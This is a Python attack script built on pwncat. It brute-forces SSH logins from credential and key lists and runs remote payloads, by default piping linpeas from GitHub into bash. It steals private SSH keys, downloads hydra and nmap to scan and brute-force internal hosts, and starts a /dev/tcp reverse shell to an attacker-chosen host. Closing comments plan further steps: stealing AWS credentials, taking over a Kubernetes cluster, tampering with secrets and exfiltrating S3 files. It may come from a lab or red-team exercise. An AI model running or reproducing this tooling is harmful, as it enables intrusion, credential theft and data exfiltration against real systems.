#!/usr/bin/env python3
import base64
import os
import pwncat.manager
from pwncat.channel import ChannelError
import subprocess
import argparse
from pathlib import Path
import time

parser = argparse.ArgumentParser(description='reverse shell listener')
parser.add_argument('--user', dest='user', type=str,
                    default=None, help='target user')
parser.add_argument('--password', dest='password', type=str,
                    default=None, help='target password')
parser.add_argument('--identity', dest='identity', type=str,
                    default=None, help='target identity (format: base64 encoded single line)')
parser.add_argument('--user-list', dest='user_list', type=str,
                    help='target users file path')
parser.add_argument('--password-list', dest='password_list', type=str,
                    default=None, help='target passwords file path')
parser.add_argument('--identity-list', dest='identity_list', type=str,
                    default=None, help='target identities file path (format: base64 encoded single line per identity)')
parser.add_argument('--payload', dest='payload', type=str,
                    default=base64.b64encode(b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex'), help='target base64 payload to deliver')
parser.add_argument('--task', dest='task', type=str,
                    default="custom", help='target task name - use custom to execute payload')
parser.add_argument('--target-ip', dest='target_ip', type=str,
                    required=True, help='target ip')
parser.add_argument('--target-port', dest='target_port', type=int,
                    default=22, help='target port')
parser.add_argument('--reverse-shell-host', dest='reverse_shell_host', type=str,
                    required=True, help='reverse shell host to be used as second stage')
parser.add_argument('--reverse-shell-port', dest='reverse_shell_port', type=str,
                    required=True, help='reverse shell port to be used as second stage')

args = parser.parse_args()


def execute(session: pwncat.manager.Session, task):
    session.log("starting module")
    session_lock = Path("/tmp/pwncat_connector_session.lock")
    session_lock.touch()
    try:
        if task == "custom":
            payload = base64.b64encode(str(args.payload).encode("utf-8"))
            result = session.platform.run(
                f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector | base64 -d | /bin/bash'",
                cwd="/tmp", timeout=900)
            session.log(result)
        elif task == "scan2kubeshell":
            payload = base64.b64encode(
                b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex')
            result = session.platform.run(
                f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector_linpeas | base64 -d | /bin/bash'",
                cwd="/tmp", timeout=900)
            session.log(result)

            result = session.platform.run(
                'rm -f /tmp/ssh_keys.tar /tmp/ssh_keys.tar.gz 2>/dev/null; for f in $(find  /home /root -name .ssh 2>/dev/null | xargs -I {} find {} -type f); do if grep "PRIVATE" $f >/dev/null; then tar -C $(dirname $f) -rvf /tmp/ssh_keys.tar $f 2>/dev/null; fi done; gzip /tmp/ssh_keys.tar',
                cwd="/tmp", timeout=900)
            session.log(result)

            session.log("copying /tmp/ssh_keys.tar.gz...")
            with session.platform.open('/tmp/ssh_keys.tar.gz', 'rb') as f1:
                with open(f'/tmp/{args.target_ip}_ssh_keys.tar.gz', 'wb') as f2:
                    f2.write(f1.read())

            session.log(
                "creating local /tmp/identities.txt with discovered keys...")
            payload = base64.b64encode(
                f'rm -rf /tmp/ssh_keys; mkdir /tmp/ssh_keys; tar -zxvf /tmp/{args.target_ip}_ssh_keys.tar.gz -C "/tmp/ssh_keys"; cd /tmp/ssh_keys; truncate -s0 /tmp/identities.txt; for k in $(find /tmp/ssh_keys -type f); do cat $k | base64 -w0 >> /tmp/identities.txt; done'.encode('utf-8'))
            result = subprocess.run(
                ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_extractidentites | base64 -d | /bin/bash'], cwd="/tmp", capture_output=True, text=True)
            session.log(result)

            session.log("building nmap and hydra scan paylod...")
            payload = ""
            with open("scan.sh") as f:
                payload = base64.b64encode(f.read().encode("utf-8"))

            session.log("running scan payload...")
            result = session.platform.run(
                f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector_scan | base64 -d | /bin/bash'",
                cwd="/tmp", timeout=900)
            session.log(result)

            files = ["/tmp/scan.json", "/tmp/hydra-targets.txt",
                     "/tmp/hydra.txt", "/tmp/hydra-found.txt"]
            file_list = ", ".join(files)
            session.log(
                f"copying scan results: {file_list}...")
            for file in files:
                with session.platform.open(file, 'rb') as f1:
                    with open(f'/tmp/{args.target_ip}_{os.path.basename(file)}', 'wb') as f2:
                        f2.write(f1.read())

            session.log(
                f"reading local /tmp/{args.target_ip}_hydra-targets.txt...")
            ssh_targets = []
            with open(f"/tmp/{args.target_ip}_hydra-targets.txt") as f:
                ssh_targets = f.read().splitlines()
            session.log(f"found ssh target - {ssh_targets[0]}")

            # ideally we determine the key using the ssh_keys archive paths
            # and enumerate? but for now we will have to _cheat_ a little

            ssh_paylod = f'ssh -o StrictHostKeyChecking=accept-new -i ~/.ssh/secret_key root@{ssh_targets[0]} "nohup /bin/bash -c \"TASK=scan2kubeshell /bin/bash -i >& /dev/tcp/{args.reverse_shell_host}/{args.reverse_shell_port} 0>&1\" >/dev/null 2>&1 &"'
            session.log(
                f"starting reverse shell hand off on remote host off via ssh: {ssh_paylod}")
            result = session.platform.run(
                ssh_paylod,
                cwd="/tmp", timeout=900)

            session.log("connector session complete")
    except Exception as e:
        session.log(f'Error executing bash script: {e}')
    finally:
        session_lock.unlink()


users = []
passwords = []
identities = []
payload = args.payload

if args.user_list is not None and Path(args.user_list).exists():
    with open(Path(args.user_list)) as f:
        users = f.read().splitlines()
elif args.user is not None:
    users.append(args.user)

if args.password_list is not None and Path(args.password_list).exists():
    with open(Path(args.password_list)) as f:
        passwords = f.read().splitlines()
elif args.password is not None:
    passwords.append(args.password)

if args.identity_list is not None and Path(args.identity_list).exists():
    with open(Path(args.identity_list)) as f:
        for i in f.read().splitlines():
            identities.append(base64.b64decode(i))
elif args.identity is not None:
    identities.append(base64.b64decode(args.identity))

# check for valid state
if not len(users):
    raise Exception("Either --user or --user-list are required")

if not len(passwords) and not len(identities):
    raise Exception(
        "One of --password, --identity, --password-list, or --identity-list are required")

# enumerate users
success = False
for user in users:
    # enumerate passwords
    for password in passwords:
        # ssh password connection
        try:
            with pwncat.manager.Manager() as manager:
                # Establish a pwncat session
                manager.load_modules(os.path.join(os.getcwd(), "plugins"))
                manager.config.set("verbose", True, glob=True)
                print(
                    f"SSH password login attempt: {user}:{password}@{args.target_ip}:{args.target_port}")
                session = manager.create_session(
                    "linux",
                    host=args.target_ip,
                    port=args.target_port,
                    user=user,
                    password=password,
                )
                execute(session, args.task)
                success = True
        except ChannelError as e:
            if e.args[0] in [
                'ssh authentication failed: Authentication failed.',
                'ssh connection failed: No authentication methods available',
                'ssh connection failed: Error reading SSH protocol banner[Errno 104] Connection reset by peer'
            ]:
                print("Authentication failed: Bad password or user name.")
                time.sleep(1.5)
            elif e.args[0] in [
                'ssh connection failed: Error reading SSH protocol banner'
            ]:
                reconnect = True
                wait_loop = 1
                while reconnect:
                    sleep_time = 30*wait_loop
                    print(
                        f"Connection rejected - sleeping {sleep_time} seconds before retry")
                    time.sleep(sleep_time)
                    try:
                        with pwncat.manager.Manager() as manager:
                            # Establish a pwncat session
                            manager.load_modules(
                                os.path.join(os.getcwd(), "plugins"))
                            manager.config.set("verbose", True, glob=True)
                            print(
                                f"SSH identity login attempt: {user}@{args.target_ip}:{args.target_port}")
                            session = manager.create_session(
                                "linux",
                                host=args.target_ip,
                                port=args.target_port,
                                user=user,
                                password=password,
                            )
                            execute(session, args.task)
                            success = True
                            reconnect = False
                    except ChannelError as e:
                        if e.args[0] in [
                            'ssh connection failed: Error reading SSH protocol banner'
                        ]:
                            print(f"Connection error: {e.args[0]}")
                            wait_loop += 1
                        else:
                            print(
                                "Authentication failed: Bad password or user name.")
                            time.sleep(1.5)
                            reconnect = False

            else:
                raise e

        # stop password enumeration
        if success:
            break

    # enumerate identities
    for identity in identities:
        # ssh identity connection
        try:
            with pwncat.manager.Manager() as manager:
                # Establish a pwncat session
                manager.load_modules(os.path.join(os.getcwd(), "plugins"))
                manager.config.set("verbose", True, glob=True)
                print(
                    f"SSH identity login attempt: {user}@{args.target_ip}:{args.target_port}")
                session = manager.create_session(
                    "linux",
                    host=args.target_ip,
                    port=args.target_port,
                    user=user,
                    identity=identity,
                )
                execute(session, args.task)
                success = True
        except ChannelError as e:
            if e.args[0] in [
                'ssh authentication failed: Authentication failed.',
                'ssh connection failed: No authentication methods available',
                'ssh connection failed: Error reading SSH protocol banner[Errno 104] Connection reset by peer'
            ]:
                print("Authentication failed: Bad password or user name.")
                time.sleep(1.5)
            elif e.args[0] in [
                'ssh connection failed: Error reading SSH protocol banner'
            ]:
                reconnect = True
                wait_loop = 1
                while reconnect:
                    sleep_time = 30*wait_loop
                    print(
                        f"Connection rejected - sleeping {sleep_time} seconds before retry")
                    time.sleep(sleep_time)
                    try:
                        with pwncat.manager.Manager() as manager:
                            # Establish a pwncat session
                            manager.load_modules(
                                os.path.join(os.getcwd(), "plugins"))
                            manager.config.set("verbose", True, glob=True)
                            print(
                                f"SSH identity login attempt: {user}@{args.target_ip}:{args.target_port}")
                            session = manager.create_session(
                                "linux",
                                host=args.target_ip,
                                port=args.target_port,
                                user=user,
                                password=password,
                            )
                            execute(session, args.task)
                            success = True
                            reconnect = False
                    except ChannelError as e:
                        if e.args[0] in [
                            'ssh connection failed: Error reading SSH protocol banner'
                        ]:
                            print(f"Connection error: {e.args[0]}")
                            wait_loop += 1
                        else:
                            print(
                                "Authentication failed: Bad password or user name.")
                            time.sleep(1.5)
                            reconnect = False
            else:
                raise e

        # stop identity enumeration
        if success:
            break

    # stop user enumeration
    if success:
        break

# archive all private keys
# rm /tmp/ssh_keys.tar /tmp/ssh_keys.tgz 2>/dev/null; for f in $(find  /home /root -name .ssh | xargs -I {} find {} -type f); do; if grep "PRIVATE" $f>/dev/null; then tar -rvf /tmp/ssh_keys.tar $f; fi done && gzip /tmp/ssh_keys.tar > /tmp/ssh_keys.tgz

# now we need to:
# - start an ssh session with this password to jumphost.attacker-hub.freedns.org (done)
# - archive all of the private keys on the machine and copy to local (done)
# - nmap script from jump host to discover ssh on kubeadmin (this will provide internal IP but we will use external access)
# - hydra discovered host with failed user names and passwords
# - LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
# - echo $LOCAL_NET > /tmp/hydra-targets.txt
# - curl -LJ https://github.com/credibleforce/static-hydra/raw/main/binaries/linux/x86_64/hydra -o /tmp/hydra && chmod 755 /tmp/hydra
# - /tmp/hydra -V -L /tmp/users.txt -P /tmp/passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh
# - curl -LJ https://github.com/credibleforce/static-binaries/raw/master/binaries/linux/x86_64/nmap -o /tmp/nmap && chmod 755 /tmp/nmap
# - /tmp/nmap -sT --top-ports $LOCAL_NET
# - archive all of the private keys on the machine and copy to local
# - use ssh and identity to execute curl http://icanhazip.com
# - use ssh and identity to execute reverse shell back to reverse shell - hand off using TASK

# now we're in the reverse shell:
# - reverse shell executes linpeas and pulls back aws credentials
# - use credentials to call aws eks list-clusters and find our cluster
# - use credentials to call aws eks update-kubeconfig --name=<cluster>
# - copy kubeconfig back to attacker
# - use local kubectl to execute eks discovery
# - run general kubernetes discovery (e.g. pierates or https://github.com/corneliusweig/rakkess)
# - discover s3app pod with directory listing and associated aws credentials
# - list secrets to discovery BUCKET_NAME secret store
# - update BUCKET_NAME value to point to prod
# - proxy local connection to s3app to enumerate files
# - download sensitive files
# - ** optional **
# - start privileged pod to mount node filesystem
# - start second reverse shell with nmap and linpeas.sh from node
# - exec into s3app to obtain a session for the role used in the pod
# - abuse this as necessary
